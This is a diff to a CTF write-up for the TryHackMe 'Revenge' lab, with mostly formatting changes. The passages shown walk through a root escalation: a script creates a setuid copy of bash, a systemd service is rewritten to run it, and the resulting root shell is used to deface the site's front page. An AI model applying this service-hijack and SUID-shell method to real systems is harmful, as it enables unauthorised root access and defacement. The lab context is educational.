@@ -3,7 +3,7 @@ title: thm - revenge
 description: write-up for the ducky room in thm
 author: z3nn
 date: 2020-10-19 22:17:34 +0300
-categories: [tryhackme,  hacking]
+categories: [Hacking, TryHackMe]
 tags: [security,  sqlmap,  real-world,  enumeration,  ctf,  hacking,  tryhackme,  linux]
 ---
 
@@ -212,16 +212,17 @@ WantedBy=multi-user.target
 ## Step 2
 We need to create a script that will help us elevate our access.
 > Chmod 4755 (chmod a+rwx,g-w,o-w,ug+s,+t,g-s,-t) sets permissions so that, (U)ser / owner can read, can write and can execute. (G)roup can read, can't write and can execute. (O)thers can read, can't write and can execute.
+
 ```
 server-admin@duckyinc:~$ cat adminplox.sh 
 #!/bin/bash
-
 cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
 server-admin@duckyinc:~$ chmod +x adminplox.sh
 ```
 
 ## Step 3
 Update `/etc/systemd/system/duckyinc.service` so that it will execute our script.
+
 ```
 server-admin@duckyinc:~$ cat /etc/systemd/system/duckyinc.service 
 [Unit]
@@ -239,10 +240,12 @@ ExecStop=/bin/kill -s TERM $MAINPID
 [Install]
 WantedBy=multi-user.target
 ```
+
 >Don't forget to change the User and Group values to `root` or else you'll end up with a `flask:www-data` shell.
 
 ## Step 4
 Execute the `/bin/systemctl` commands available to us as sudo, then run the `shell` we have in `/tmp` with `-p` option
+
 ```
 server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
 server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
@@ -266,6 +269,7 @@ root
 ```
 
 We are now root... and it's not yet over...
+
 ```
 bash-4.4# cd /root
 bash-4.4# ls -la
@@ -284,7 +288,9 @@ drwxr-xr-x  5 root root 4096 Aug 12 18:44 .local
 drwx------  2 root root 4096 Aug  9 15:29 .ssh
 -rw-------  1 root root 7763 Aug 12 18:57 .viminfo
 ```
+
 There's no flag in `/root` ... so I went to THM room to check that last hint, see what I actually missed and it said: `Mission objectives` ... Our `mission` was to deface the front page... so let's do that.
+
 
 ```
 bash-4.4# mv /var/www/duckyinc/templates/index.html /tmp/
@@ -305,6 +311,7 @@ drwxr-xr-x  5 root root 4096 Aug 12 18:44 .local
 drwx------  2 root root 4096 Aug  9 15:29 .ssh
 -rw-------  1 root root 7763 Aug 12 18:57 .viminfo
 ```
+
 After we move `index.html` out of it's location, we can see a `flag3.txt` pop in `/root`.
 
 Get the flag and GTFO!
